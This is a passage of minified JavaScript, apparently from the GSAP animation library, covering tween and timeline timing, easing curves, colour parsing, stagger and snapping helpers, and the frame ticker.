			return Sn(t, e), t._initted ? !i && t._pt && (t._dur && !1 !== t.vars.lazy || !t._dur && t.vars.lazy) && Gt !== hn.frame ? (qe.push(t), t._lazy = [e, n], 1) : void 0 : 1
		},
		Si = function(t) {
			var e = t.data;
			return "isFromStart" === e || "isStart" === e
		},
		Oi = function(t, e, i, n) {
			var r = t._repeat,
				s = ri(e) || 0,
				o = t._tTime / t._tDur;
			return o && !n && (t._time *= s / t._dur), t._dur = s, t._tDur = r ? r < 0 ? 1e10 : ri(s * (r + 1) + t._rDelay * r) : s, o > 0 && !n ? Ci(t, t._tTime = t._tDur * o) : t.parent && bi(t), i || Di(t.parent, t), t
		},
		Pi = function(t) {
			return t instanceof bn ? Di(t) : Oi(t, t._dur)
		},
		Ii = {
			_start: 0,
			endTime: Ge,
			totalDuration: Ge
		},
		Li = function t(e, i, n) {
			var r, s, o, a = e.labels,
				u = e._recent || Ii,
				h = e.duration() >= fe ? u.endTime(!1) : e._dur;
			return xe(i) && (isNaN(i) || i in a) ? (s = i.charAt(0), o = "%" === i.substr(-1), r = i.indexOf("="), "<" === s || ">" === s ? (r >= 0 && (i = i.replace(/=/, "")), ("<" === s ? u._start : u.endTime(u._repeat >= 0)) + (parseFloat(i.substr(1)) || 0) * (o ? (r < 0 ? u : n).totalDuration() / 100 : 1)) : r < 0 ? (i in a || (a[i] = h), a[i]) : (s = parseFloat(i.charAt(r - 1) + i.substr(r + 1)), o && n && (s = s / 100 * (Se(n) ? n[0] : n).totalDuration()), r > 1 ? t(e, i.substr(0, r - 1), n) + s : h + s)) : null == i ? h : +i
		},
		Bi = function(t, e, i) {
			var n, r, s = Ee(e[1]),
				o = (s ? 2 : 1) + (t < 2 ? 0 : 1),
				a = e[o];
			if (s && (a.duration = e[1]), a.parent = i, t) {
				for (n = a, r = i; r && !("immediateRender" in n);) n = r.vars.defaults || {}, r = Te(r.vars.inherit) && r.parent;
				a.immediateRender = Te(n.immediateRender), t < 2 ? a.runBackwards = 1 : a.startAt = e[o - 1]
			}
			return new Bn(e[0], a, e[o + 1])
		},
		ki = function(t, e) {
			return t || 0 === t ? e(t) : e
		},
		Ri = function(t, e, i) {
			return i < t ? t : i > e ? e : i
		},
		Ni = function(t, e) {
			return xe(t) && (e = Re.exec(t)) ? e[1] : ""
		},
		Wi = [].slice,
		zi = function(t, e) {
			return t && Ce(t) && "length" in t && (!e && !t.length || t.length - 1 in t && Ce(t[0])) && !t.nodeType && t !== zt
		},
		Ui = function(t, e, i) {
			return !xe(t) || i || !Ut && ln() ? Se(t) ? function(t, e, i) {
				return void 0 === i && (i = []), t.forEach((function(t) {
					var n;
					return xe(t) && !e || zi(t, 1) ? (n = i).push.apply(n, Ui(t)) : i.push(t)
				})) || i
			}(t, i) : zi(t) ? Wi.call(t, 0) : t ? [t] : [] : Wi.call((e || jt).querySelectorAll(t), 0)
		},
		ji = function(t) {
			return t.sort((function() {
				return .5 - Math.random()
			}))
		},
		Vi = function(t) {
			if (we(t)) return t;
			var e = Ce(t) ? t : {
					each: t
				},
				i = vn(e.ease),
				n = e.from || 0,
				r = parseFloat(e.base) || 0,
				s = {},
				o = n > 0 && n < 1,
				a = isNaN(n) || o,
				u = e.axis,
				h = n,
				l = n;
			return xe(n) ? h = l = {
					center: .5,
					edges: .5,
					end: 1
				} [n] || 0 : !o && a && (h = n[0], l = n[1]),
				function(t, o, c) {
					var d, p, f, m, g, v, _, D, y, x = (c || e).length,
						w = s[x];
					if (!w) {
						if (!(y = "auto" === e.grid ? 0 : (e.grid || [1, fe])[1])) {
							for (_ = -fe; _ < (_ = c[y++].getBoundingClientRect().left) && y < x;);
							y--
						}
						for (w = s[x] = [], d = a ? Math.min(y, x) * h - .5 : n % y, p = y === fe ? 0 : a ? x * l / y - .5 : n / y | 0, _ = 0, D = fe, v = 0; v < x; v++) f = v % y - d, m = p - (v / y | 0), w[v] = g = u ? Math.abs("y" === u ? m : f) : _e(f * f + m * m), g > _ && (_ = g), g < D && (D = g);
						"random" === n && ji(w), w.max = _ - D, w.min = D, w.v = x = (parseFloat(e.amount) || parseFloat(e.each) * (y > x ? x - 1 : u ? "y" === u ? x / y : y : Math.max(y, x / y)) || 0) * ("edges" === n ? -1 : 1), w.b = x < 0 ? r - x : r, w.u = Ni(e.amount || e.each) || 0, i = i && x < 0 ? mn(i) : i
					}
					return x = (w[t] - w.min) / w.max || 0, ri(w.b + (i ? i(x) : x) * w.v) + w.u
				}
		},
		Gi = function(t) {
			var e = Math.pow(10, ((t + "").split(".")[1] || "").length);
			return function(i) {
				var n = Math.round(parseFloat(i) / t) * t * e;
				return (n - n % 1) / e + (Ee(i) ? 0 : Ni(i))
			}
		},
		Hi = function(t, e) {
			var i, n, r = Se(t);
			return !r && Ce(t) && (i = r = t.radius || fe, t.values ? (t = Ui(t.values), (n = !Ee(t[0])) && (i *= i)) : t = Gi(t.increment)), ki(e, r ? we(t) ? function(e) {
				return n = t(e), Math.abs(n - e) <= i ? n : e
			} : function(e) {
				for (var r, s, o = parseFloat(n ? e.x : e), a = parseFloat(n ? e.y : 0), u = fe, h = 0, l = t.length; l--;)(r = n ? (r = t[l].x - o) * r + (s = t[l].y - a) * s : Math.abs(t[l] - o)) < u && (u = r, h = l);
				return h = !i || u <= i ? t[h] : e, n || h === e || Ee(e) ? h : h + Ni(e)
			} : Gi(t))
		},
		qi = function(t, e, i, n) {
			return ki(Se(t) ? !e : !0 === i ? !!(i = 0) : !n, (function() {
				return Se(t) ? t[~~(Math.random() * t.length)] : (i = i || 1e-5) && (n = i < 1 ? Math.pow(10, (i + "").length - 2) : 1) && Math.floor(Math.round((t - i / 2 + Math.random() * (e - t + .99 * i)) / i) * i * n) / n
			}))
		},
		Yi = function(t, e, i) {
			return ki(i, (function(i) {
				return t[~~e(i)]
			}))
		},
		Xi = function(t) {
			for (var e, i, n, r, s = 0, o = ""; ~(e = t.indexOf("random(", s));) n = t.indexOf(")", e), r = "[" === t.charAt(e + 7), i = t.substr(e + 7, n - e - 7).match(r ? ke : Oe), o += t.substr(s, e - s) + qi(r ? i : +i[0], r ? 0 : +i[1], +i[2] || 1e-5), s = n + 1;
			return o + t.substr(s, t.length - s)
		},
		$i = function(t, e, i, n, r) {
			var s = e - t,
				o = n - i;
			return ki(r, (function(e) {
				return i + ((e - t) / s * o || 0)
			}))
		},
		Zi = function(t, e, i) {
			var n, r, s, o = t.labels,
				a = fe;
			for (n in o)(r = o[n] - e) < 0 == !!i && r && a > (r = Math.abs(r)) && (s = n, a = r);
			return s
		},
		Ki = function(t, e, i) {
			var n, r, s = t.vars,
				o = s[e];
			if (o) return n = s[e + "Params"], r = s.callbackScope || t, i && qe.length && ai(), n ? o.apply(r, n) : o.call(r)
		},
		Qi = function(t) {
			return _i(t), t.scrollTrigger && t.scrollTrigger.kill(!1), t.progress() < 1 && Ki(t, "onInterrupt"), t
		},
		Ji = function(t) {
			var e = (t = !t.name && t.default || t).name,
				i = we(t),
				n = e && !i && t.init ? function() {
					this._props = []
				} : t,
				r = {
					init: Ge,
					render: Gn,
					add: Mn,
					kill: qn,
					modifier: Hn,
					rawVars: 0
				},
				s = {
					targetTest: 0,
					get: 0,
					getSetter: zn,
					aliases: {},
					register: 0
				};
			if (ln(), t !== n) {
				if (Xe[e]) return;
				ci(n, ci(fi(t, r), s)), di(n.prototype, di(r, fi(t, s))), Xe[n.prop = e] = n, t.targetTest && (Ke.push(n), He[e] = 1), e = ("css" === e ? "CSS" : e.charAt(0).toUpperCase() + e.substr(1)) + "Plugin"
			}
			Ve(e, n), t.register && t.register(Jn, n, $n)
		},
		tn = {
			aqua: [0, 255, 255],
			lime: [0, 255, 0],
			silver: [192, 192, 192],
			black: [0, 0, 0],
			maroon: [128, 0, 0],
			teal: [0, 128, 128],
			blue: [0, 0, 255],
			navy: [0, 0, 128],
			white: [255, 255, 255],
			olive: [128, 128, 0],
			yellow: [255, 255, 0],
			orange: [255, 165, 0],
			gray: [128, 128, 128],
			purple: [128, 0, 128],
			green: [0, 128, 0],
			red: [255, 0, 0],
			pink: [255, 192, 203],
			cyan: [0, 255, 255],
			transparent: [255, 255, 255, 0]
		},
		en = function(t, e, i) {
			return 255 * (6 * (t += t < 0 ? 1 : t > 1 ? -1 : 0) < 1 ? e + (i - e) * t * 6 : t < .5 ? i : 3 * t < 2 ? e + (i - e) * (2 / 3 - t) * 6 : e) + .5 | 0
		},
		nn = function(t, e, i) {
			var n, r, s, o, a, u, h, l, c, d, p = t ? Ee(t) ? [t >> 16, t >> 8 & 255, 255 & t] : 0 : tn.black;
			if (!p) {
				if ("," === t.substr(-1) && (t = t.substr(0, t.length - 1)), tn[t]) p = tn[t];
				else if ("#" === t.charAt(0)) {
					if (t.length < 6 && (n = t.charAt(1), r = t.charAt(2), s = t.charAt(3), t = "#" + n + n + r + r + s + s + (5 === t.length ? t.charAt(4) + t.charAt(4) : "")), 9 === t.length) return [(p = parseInt(t.substr(1, 6), 16)) >> 16, p >> 8 & 255, 255 & p, parseInt(t.substr(7), 16) / 255];
					p = [(t = parseInt(t.substr(1), 16)) >> 16, t >> 8 & 255, 255 & t]
				} else if ("hsl" === t.substr(0, 3))
					if (p = d = t.match(Oe), e) {
						if (~t.indexOf("=")) return p = t.match(Pe), i && p.length < 4 && (p[3] = 1), p
					} else o = +p[0] % 360 / 360, a = +p[1] / 100, n = 2 * (u = +p[2] / 100) - (r = u <= .5 ? u * (a + 1) : u + a - u * a), p.length > 3 && (p[3] *= 1), p[0] = en(o + 1 / 3, n, r), p[1] = en(o, n, r), p[2] = en(o - 1 / 3, n, r);
				else p = t.match(Oe) || tn.transparent;
				p = p.map(Number)
			}
			return e && !d && (n = p[0] / 255, r = p[1] / 255, s = p[2] / 255, u = ((h = Math.max(n, r, s)) + (l = Math.min(n, r, s))) / 2, h === l ? o = a = 0 : (c = h - l, a = u > .5 ? c / (2 - h - l) : c / (h + l), o = h === n ? (r - s) / c + (r < s ? 6 : 0) : h === r ? (s - n) / c + 2 : (n - r) / c + 4, o *= 60), p[0] = ~~(o + .5), p[1] = ~~(100 * a + .5), p[2] = ~~(100 * u + .5)), i && p.length < 4 && (p[3] = 1), p
		},
		rn = function(t) {
			var e = [],
				i = [],
				n = -1;
			return t.split(on).forEach((function(t) {
				var r = t.match(Ie) || [];
				e.push.apply(e, r), i.push(n += r.length + 1)
			})), e.c = i, e
		},
		sn = function(t, e, i) {
			var n, r, s, o, a = "",
				u = (t + a).match(on),
				h = e ? "hsla(" : "rgba(",
				l = 0;
			if (!u) return t;
			if (u = u.map((function(t) {
					return (t = nn(t, e, 1)) && h + (e ? t[0] + "," + t[1] + "%," + t[2] + "%," + t[3] : t.join(",")) + ")"
				})), i && (s = rn(t), (n = i.c).join(a) !== s.c.join(a)))
				for (o = (r = t.replace(on, "1").split(Ie)).length - 1; l < o; l++) a += r[l] + (~n.indexOf(l) ? u.shift() || h + "0,0,0,0)" : (s.length ? s : u.length ? u : i).shift());
			if (!r)
				for (o = (r = t.split(on)).length - 1; l < o; l++) a += r[l] + u[l];
			return a + r[o]
		},
		on = function() {
			var t, e = "(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#(?:[0-9a-f]{3,4}){1,2}\\b";
			for (t in tn) e += "|" + t + "\\b";
			return new RegExp(e + ")", "gi")
		}(),
		an = /hsl[a]?\(/,
		un = function(t) {
			var e, i = t.join(" ");
			if (on.lastIndex = 0, on.test(i)) return e = an.test(i), t[1] = sn(t[1], e), t[0] = sn(t[0], e, rn(t[1])), !0
		},
		hn = (Jt = Date.now, te = 500, ee = 33, ie = Jt(), ne = ie, se = re = 1e3 / 240, ae = function t(e) {
			var i, n, r, s, o = Jt() - ne,
				a = !0 === e;
			if (o > te && (ie += o - ee), ((i = (r = (ne += o) - ie) - se) > 0 || a) && (s = ++Zt.frame, Kt = r - 1e3 * Zt.time, Zt.time = r /= 1e3, se += i + (i >= re ? 4 : re - i), n = 1), a || (Yt = Xt(t)), n)
				for (Qt = 0; Qt < oe.length; Qt++) oe[Qt](r, Kt, s, e)
		}, Zt = {
			time: 0,
			frame: 0,
			tick: function() {
				ae(!0)
			},
			deltaRatio: function(t) {
				return Kt / (1e3 / (t || 60))
			},
			wake: function() {
				Vt && (!Ut && Fe() && (zt = Ut = window, jt = zt.document || {}, Ne.gsap = Jn, (zt.gsapVersions || (zt.gsapVersions = [])).push(Jn.version), ze(We || zt.GreenSockGlobals || !zt.gsap && zt || {}), $t = zt.requestAnimationFrame), Yt && Zt.sleep(), Xt = $t || function(t) {
					return setTimeout(t, se - 1e3 * Zt.time + 1 | 0)
				}, qt = 1, ae(2))
			},
			sleep: function() {
				($t ? zt.cancelAnimationFrame : clearTimeout)(Yt), qt = 0, Xt = Ge
			},
			lagSmoothing: function(t, e) {
				te = t || 1 / 1e-8, ee = Math.min(e, te, 0)
			},
			fps: function(t) {
				re = 1e3 / (t || 240), se = 1e3 * Zt.time + re
			},
			add: function(t, e, i) {
				var n = e ? function(e, i, r, s) {
					t(e, i, r, s), Zt.remove(n)
				} : t;
				return Zt.remove(t), oe[i ? "unshift" : "push"](n), ln(), n
			},
			remove: function(t, e) {
				~(e = oe.indexOf(t)) && oe.splice(e, 1) && Qt >= e && Qt--
			},
			_listeners: oe = []
		}),
		ln = function() {
			return !qt && hn.wake()
		},
		cn = {},
		dn = /^[\d.\-M][\d.\-,\s]/,
		pn = /["']/g,
		fn = function(t) {
			for (var e, i, n, r = {}, s = t.substr(1, t.length - 3).split(":"), o = s[0], a = 1, u = s.length; a < u; a++) i = s[a], e = a !== u - 1 ? i.lastIndexOf(",") : i.length, n = i.substr(0, e), r[o] = isNaN(n) ? n.replace(pn, "").trim() : +n, o = i.substr(e + 1).trim();
			return r
		},
		mn = function(t) {
			return function(e) {
				return 1 - t(1 - e)
			}
		},
		gn = function t(e, i) {
			for (var n, r = e._first; r;) r instanceof bn ? t(r, i) : !r.vars.yoyoEase || r._yoyo && r._repeat || r._yoyo === i || (r.timeline ? t(r.timeline, i) : (n = r._ease, r._ease = r._yEase, r._yEase = n, r._yoyo = i)), r = r._next
		},
		vn = function(t, e) {
			return t && (we(t) ? t : cn[t] || function(t) {
				var e, i, n, r, s = (t + "").split("("),
					o = cn[s[0]];
				return o && s.length > 1 && o.config ? o.config.apply(null, ~t.indexOf("{") ? [fn(s[1])] : (e = t, i = e.indexOf("(") + 1, n = e.indexOf(")"), r = e.indexOf("(", i), e.substring(i, ~r && r < n ? e.indexOf(")", n + 1) : n)).split(",").map(hi)) : cn._CE && dn.test(t) ? cn._CE("", t) : o
			}(t)) || e
		},
		_n = function(t, e, i, n) {
			void 0 === i && (i = function(t) {
				return 1 - e(1 - t)
			}), void 0 === n && (n = function(t) {
				return t < .5 ? e(2 * t) / 2 : 1 - e(2 * (1 - t)) / 2
			});
			var r, s = {
				easeIn: e,
				easeOut: i,
				easeInOut: n
			};
			return ii(t, (function(t) {
				for (var e in cn[t] = Ne[t] = s, cn[r = t.toLowerCase()] = i, s) cn[r + ("easeIn" === e ? ".in" : "easeOut" === e ? ".out" : ".inOut")] = cn[t + "." + e] = s[e]
			})), s
		},
		Dn = function(t) {
			return function(e) {
				return e < .5 ? (1 - t(1 - 2 * e)) / 2 : .5 + t(2 * (e - .5)) / 2
			}
		},
		yn = function t(e, i, n) {
			var r = i >= 1 ? i : 1,
				s = (n || (e ? .3 : .45)) / (i < 1 ? i : 1),
				o = s / me * (Math.asin(1 / r) || 0),
				a = function(t) {
					return 1 === t ? 1 : r * Math.pow(2, -10 * t) * ye((t - o) * s) + 1
				},
				u = "out" === e ? a : "in" === e ? function(t) {
					return 1 - a(1 - t)
				} : Dn(a);
			return s = me / s, u.config = function(i, n) {
				return t(e, i, n)
			}, u
		},
		xn = function t(e, i) {
			void 0 === i && (i = 1.70158);
			var n = function(t) {
					return t ? --t * t * ((i + 1) * t + i) + 1 : 0
				},
				r = "out" === e ? n : "in" === e ? function(t) {
					return 1 - n(1 - t)
				} : Dn(n);
			return r.config = function(i) {
				return t(e, i)
			}, r
		};
	ii("Linear,Quad,Cubic,Quart,Quint,Strong", (function(t, e) {
		var i = e < 5 ? e + 1 : e;
		_n(t + ",Power" + (i - 1), e ? function(t) {
			return Math.pow(t, i)
		} : function(t) {
			return t
		}, (function(t) {
			return 1 - Math.pow(1 - t, i)
		}), (function(t) {
			return t < .5 ? Math.pow(2 * t, i) / 2 : 1 - Math.pow(2 * (1 - t), i) / 2
		}))
	})), cn.Linear.easeNone = cn.none = cn.Linear.easeIn, _n("Elastic", yn("in"), yn("out"), yn()), ue = 7.5625, le = 1 / (he = 2.75), _n("Bounce", (function(t) {
		return 1 - ce(1 - t)
	}), ce = function(t) {
		return t < le ? ue * t * t : t < .7272727272727273 ? ue * Math.pow(t - 1.5 / he, 2) + .75 : t < .9090909090909092 ? ue * (t -= 2.25 / he) * t + .9375 : ue * Math.pow(t - 2.625 / he, 2) + .984375
	}), _n("Expo", (function(t) {
		return t ? Math.pow(2, 10 * (t - 1)) : 0
	})), _n("Circ", (function(t) {
		return -(_e(1 - t * t) - 1)
	})), _n("Sine", (function(t) {
		return 1 === t ? 1 : 1 - De(t * ge)
	})), _n("Back", xn("in"), xn("out"), xn()), cn.SteppedEase = cn.steps = Ne.SteppedEase = {
		config: function(t, e) {
			void 0 === t && (t = 1);
			var i = 1 / t,
				n = t + (e ? 0 : 1),
				r = e ? 1 : 0;
			return function(t) {
				return ((n * Ri(0, 1 - 1e-8, t) | 0) + r) * i
			}
		}
	}, pe.ease = cn["quad.out"], ii("onComplete,onUpdate,onStart,onRepeat,onReverseComplete,onInterrupt", (function(t) {
		return Qe += t + "," + t + "Params,"
	}));
	var wn = function(t, e) {
			this.id = ve++, t._gsap = this, this.target = t, this.harness = e, this.get = e ? e.get : ei, this.set = e ? e.getSetter : zn
		},
		En = function() {
			function t(t) {
				this.vars = t, this._delay = +t.delay || 0, (this._repeat = t.repeat === 1 / 0 ? -2 : t.repeat || 0) && (this._rDelay = t.repeatDelay || 0, this._yoyo = !!t.yoyo || !!t.yoyoEase), this._ts = 1, Oi(this, +t.duration, 1, 1), this.data = t.data, qt || hn.wake()
			}
			var e = t.prototype;
			return e.delay = function(t) {
				return t || 0 === t ? (this.parent && this.parent.smoothChildTiming && this.startTime(this._start + t - this._delay), this._delay = t, this) : this._delay
			}, e.duration = function(t) {
				return arguments.length ? this.totalDuration(this._repeat > 0 ? t + (t + this._rDelay) * this._repeat : t) : this.totalDuration() && this._dur
			}, e.totalDuration = function(t) {
				return arguments.length ? (this._dirty = 0, Oi(this, this._repeat < 0 ? t : (t - this._repeat * this._rDelay) / (this._repeat + 1))) : this._tDur
			}, e.totalTime = function(t, e) {
				if (ln(), !arguments.length) return this._tTime;
				var i = this._dp;
				if (i && i.smoothChildTiming && this._ts) {
					for (Ci(this, t), !i._dp || i.parent || Ti(i, this); i && i.parent;) i.parent._time !== i._start + (i._ts >= 0 ? i._tTime / i._ts : (i.totalDuration() - i._tTime) / -i._ts) && i.totalTime(i._tTime, !0), i = i.parent;
					!this.parent && this._dp.autoRemoveChildren && (this._ts > 0 && t < this._tDur || this._ts < 0 && t > 0 || !this._tDur && !t) && Fi(this._dp, this, this._start - this._delay)
				}
				return (this._tTime !== t || !this._dur && !e || this._initted && 1e-8 === Math.abs(this._zTime) || !t && !this._initted && (this.add || this._ptLookup)) && (this._ts || (this._pTime = t), ui(this, t, e)), this
			}, e.time = function(t, e) {
				return arguments.length ? this.totalTime(Math.min(this.totalDuration(), t + xi(this)) % (this._dur + this._rDelay) || (t ? this._dur : 0), e) : this._time
			}, e.totalProgress = function(t, e) {
				return arguments.length ? this.totalTime(this.totalDuration() * t, e) : this.totalDuration() ? Math.min(1, this._tTime / this._tDur) : this.ratio
			}, e.progress = function(t, e) {
				return arguments.length ? this.totalTime(this.duration() * (!this._yoyo || 1 & this.iteration() ? t : 1 - t) + xi(this), e) : this.duration() ? Math.min(1, this._time / this._dur) : this.ratio
			}, e.iteration = function(t, e) {
				var i = this.duration() + this._rDelay;
				return arguments.length ? this.totalTime(this._time + (t - 1) * i, e) : this._repeat ? wi(this._tTime, i) + 1 : 1
			}, e.timeScale = function(t) {
				if (!arguments.length) return -1e-8 === this._rts ? 0 : this._rts;
				if (this._rts === t) return this;
				var e = this.parent && this._ts ? Ei(this.parent._time, this) : this._tTime;
				return this._rts = +t || 0, this._ts = this._ps || -1e-8 === t ? 0 : this._rts, this.totalTime(Ri(-this._delay, this._tDur, e), !0), bi(this), yi(this)
			}, e.paused = function(t) {
				return arguments.length ? (this._ps !== t && (this._ps = t, t ? (this._pTime = this._tTime || Math.max(-this._delay, this.rawTime()), this._ts = this._act = 0) : (ln(), this._ts = this._rts, this.totalTime(this.parent && !this.parent.smoothChildTiming ? this.rawTime() : this._tTime || this._pTime, 1 === this.progress() && 1e-8 !== Math.abs(this._zTime) && (this._tTime -= 1e-8)))), this) : this._ps
			}, e.startTime = function(t) {
				if (arguments.length) {
					this._start = t;
					var e = this.parent || this._dp;
					return e && (e._sort || !this.parent) && Fi(e, this, t - this._delay), this
				}
				return this._start
			}, e.endTime = function(t) {
				return this._start + (Te(t) ? this.totalDuration() : this.duration()) / Math.abs(this._ts || 1)
			}, e.rawTime = function(t) {
				var e = this.parent || this._dp;
				return e ? t && (!this._ts || this._repeat && this._time && this.totalProgress() < 1) ? this._tTime % (this._dur + this._rDelay) : this._ts ? Ei(e.rawTime(t), this) : this._tTime : this._tTime
			}, e.globalTime = function(t) {
				for (var e = this, i = arguments.length ? t : e.rawTime(); e;) i = e._start + i / (e._ts || 1), e = e._dp;
				return i
			}, e.repeat = function(t) {
				return arguments.length ? (this._repeat = t === 1 / 0 ? -2 : t, Pi(this)) : -2 === this._repeat ? 1 / 0 : this._repeat
			}, e.repeatDelay = function(t) {
				if (arguments.length) {
					var e = this._time;
					return this._rDelay = t, Pi(this), e ? this.time(e) : this
				}
				return this._rDelay
			}, e.yoyo = function(t) {
				return arguments.length ? (this._yoyo = t, this) : this._yoyo
			}, e.seek = function(t, e) {
				return this.totalTime(Li(this, t), Te(e))
			}, e.restart = function(t, e) {
				return this.play().totalTime(t ? -this._delay : 0, Te(e))
			}, e.play = function(t, e) {
				return null != t && this.seek(t, e), this.reversed(!1).paused(!1)
			}, e.reverse = function(t, e) {
				return null != t && this.seek(t || this.totalDuration(), e), this.reversed(!0).paused(!1)
			}, e.pause = function(t, e) {
				return null != t && this.seek(t, e), this.paused(!0)
			}, e.resume = function() {
				return this.paused(!1)
			}, e.reversed = function(t) {
				return arguments.length ? (!!t !== this.reversed() && this.timeScale(-this._rts || (t ? -1e-8 : 0)), this) : this._rts < 0
			}, e.invalidate = function() {
				return this._initted = this._act = 0, this._zTime = -1e-8, this
			}, e.isActive = function() {
				var t, e = this.parent || this._dp,
					i = this._start;
				return !(e && !(this._ts && this._initted && e.isActive() && (t = e.rawTime(!0)) >= i && t < this.endTime(!0) - 1e-8))
			}, e.eventCallback = function(t, e, i) {
				var n = this.vars;
				return arguments.length > 1 ? (e ? (n[t] = e, i && (n[t + "Params"] = i), "onUpdate" === t && (this._onUpdate = e)) : delete n[t], this) : n[t]
			}, e.then = function(t) {
				var e = this;
				return new Promise((function(i) {
					var n = we(t) ? t : li,
						r = function() {
							var t = e.then;
							e.then = null, we(n) && (n = n(e)) && (n.then || n === e) && (e.then = t), i(n), e.then = t
						};
					e._initted && 1 === e.totalProgress() && e._ts >= 0 || !e._tTime && e._ts < 0 ? r() : e._prom = r
				}))
			}, e.kill = function() {
				Qi(this)
			}, t
		}();
	ci(En.prototype, {
		_time: 0,
		_start: 0,
		_end: 0,
		_tTime: 0,
		_tDur: 0,
		_dirty: 0,
		_repeat: 0,
		_yoyo: !1,
		parent: null,
		_initted: !1,
		_rDelay: 0,
		_ts: 1,
		_dp: 0,
		ratio: 0,
		_zTime: -1e-8,
		_prom: 0,
		_ps: !1,
		_rts: 1
	});
	var bn = function(t) {
		function e(e, i) {
			var n;
			return void 0 === e && (e = {}), (n = t.call(this, e) || this).labels = {}, n.smoothChildTiming = !!e.smoothChildTiming, n.autoRemoveChildren = !!e.autoRemoveChildren, n._sort = Te(e.sortChildren), Wt && Fi(e.parent || Wt, kt(n), i), e.reversed && n.reverse(), e.paused && n.paused(!0), e.scrollTrigger && Mi(kt(n), e.scrollTrigger), n
		}
		Rt(e, t);
		var i = e.prototype;
		return i.to = function(t, e, i) {
			return Bi(0, arguments, this), this
		}, i.from = function(t, e, i) {
			return Bi(1, arguments, this), this
		}, i.fromTo = function(t, e, i, n) {
			return Bi(2, arguments, this), this
		}, i.set = function(t, e, i) {
			return e.duration = 0, e.parent = this, mi(e).repeatDelay || (e.repeat = 0), e.immediateRender = !!e.immediateRender, new Bn(t, e, Li(this, i), 1), this
		}, i.call = function(t, e, i) {
			return Fi(this, Bn.delayedCall(0, t, e), i)
		}, i.staggerTo = function(t, e, i, n, r, s, o) {
			return i.duration = e, i.stagger = i.stagger || n, i.onComplete = s, i.onCompleteParams = o, i.parent = this, new Bn(t, i, Li(this, r)), this
		}, i.staggerFrom = function(t, e, i, n, r, s, o) {
			return i.runBackwards = 1, mi(i).immediateRender = Te(i.immediateRender), this.staggerTo(t, e, i, n, r, s, o)
		}, i.staggerFromTo = function(t, e, i, n, r, s, o, a) {
			return n.startAt = i, mi(n).immediateRender = Te(n.immediateRender), this.staggerTo(t, e, n, r, s, o, a)
		}, i.render = function(t, e, i) {
			var n, r, s, o, a, u, h, l, c, d, p, f, m = this._time,
				g = this._dirty ? this.totalDuration() : this._tDur,
				v = this._dur,
				_ = t <= 0 ? 0 : ri(t),
				D = this._zTime < 0 != t < 0 && (this._initted || !v);
			if (this !== Wt && _ > g && t >= 0 && (_ = g), _ !== this._tTime || i || D) {
				if (m !== this._time && v && (_ += this._time - m, t += this._time - m), n = _, c = this._start, u = !(l = this._ts), D && (v || (m = this._zTime), (t || !e) && (this._zTime = t)), this._repeat) {
					if (p = this._yoyo, a = v + this._rDelay, this._repeat < -1 && t < 0) return this.totalTime(100 * a + t, e, i);
					if (n = ri(_ % a), _ === g ? (o = this._repeat, n = v) : ((o = ~~(_ / a)) && o === _ / a && (n = v, o--), n > v && (n = v)), d = wi(this._tTime, a), !m && this._tTime && d !== o && (d = o), p && 1 & o && (n = v - n, f = 1), o !== d && !this._lock) {
						var y = p && 1 & d,
							x = y === (p && 1 & o);
						if (o < d && (y = !y), m = y ? 0 : v, this._lock = 1, this.render(m || (f ? 0 : ri(o * a)), e, !v)._lock = 0, this._tTime = _, !e && this.parent && Ki(this, "onRepeat"), this.vars.repeatRefresh && !f && (this.invalidate()._lock = 1), m && m !== this._time || u !== !this._ts || this.vars.onRepeat && !this.parent && !this._act) return this;
						if (v = this._dur, g = this._tDur, x && (this._lock = 2, m = y ? v : -1e-4, this.render(m, !0), this.vars.repeatRefresh && !f && this.invalidate()), this._lock = 0, !this._ts && !u) return this;
						gn(this, f)
					}
				}
				if (this._hasPause && !this._forcing && this._lock < 2 && (h = function(t, e, i) {
						var n;
						if (i > e)
							for (n = t._first; n && n._start <= i;) {
								if ("isPause" === n.data && n._start > e) return n;
								n = n._next
							} else
								for (n = t._last; n && n._start >= i;) {
									if ("isPause" === n.data && n._start < e) return n;
									n = n._prev
								}
					}(this, ri(m), ri(n))) && (_ -= n - (n = h._start)), this._tTime = _, this._time = n, this._act = !l, this._initted || (this._onUpdate = this.vars.onUpdate, this._initted = 1, this._zTime = t, m = 0), !m && n && !e && (Ki(this, "onStart"), this._tTime !== _)) return this;
				if (n >= m && t >= 0)
					for (r = this._first; r;) {
						if (s = r._next, (r._act || n >= r._start) && r._ts && h !== r) {
							if (r.parent !== this) return this.render(t, e, i);
							if (r.render(r._ts > 0 ? (n - r._start) * r._ts : (r._dirty ? r.totalDuration() : r._tDur) + (n - r._start) * r._ts, e, i), n !== this._time || !this._ts && !u) {
								h = 0, s && (_ += this._zTime = -1e-8);
								break
							}
						}
						r = s
					} else {
						r = this._last;
						for (var w = t < 0 ? t : n; r;) {
							if (s = r._prev, (r._act || w <= r._end) && r._ts && h !== r) {
								if (r.parent !== this) return this.render(t, e, i);
								if (r.render(r._ts > 0 ? (w - r._start) * r._ts : (r._dirty ? r.totalDuration() : r._tDur) + (w - r._start) * r._ts, e, i), n !== this._time || !this._ts && !u) {
									h = 0, s && (_ += this._zTime = w ? -1e-8 : 1e-8);
									break
								}
							}
							r = s
						}
					}
				if (h && !e && (this.pause(), h.render(n >= m ? 0 : -1e-8)._zTime = n >= m ? 1 : -1, this._ts)) return this._start = c, bi(this), this.render(t, e, i);
				this._onUpdate && !e && Ki(this, "onUpdate", !0), (_ === g && this._tTime >= this.totalDuration() || !_ && m) && (c !== this._start && Math.abs(l) === Math.abs(this._ts) || this._lock || ((t || !v) && (_ === g && this._ts > 0 || !_ && this._ts < 0) && _i(this, 1), e || t < 0 && !m || !_ && !m && g || (Ki(this, _ === g && t >= 0 ? "onComplete" : "onReverseComplete", !0), this._prom && !(_ < g && this.timeScale() > 0) && this._prom())))
			}
			return this
		}, i.add = function(t, e) {
			var i = this;
			if (Ee(e) || (e = Li(this, e, t)), !(t instanceof En)) {
				if (Se(t)) return t.forEach((function(t) {
					return i.add(t, e)
				})), this;
				if (xe(t)) return this.addLabel(t, e);
				if (!we(t)) return this;
				t = Bn.delayedCall(0, t)
			}
			return this !== t ? Fi(this, t, e) : this
		}, i.getChildren = function(t, e, i, n) {
			void 0 === t && (t = !0), void 0 === e && (e = !0), void 0 === i && (i = !0), void 0 === n && (n = -fe);
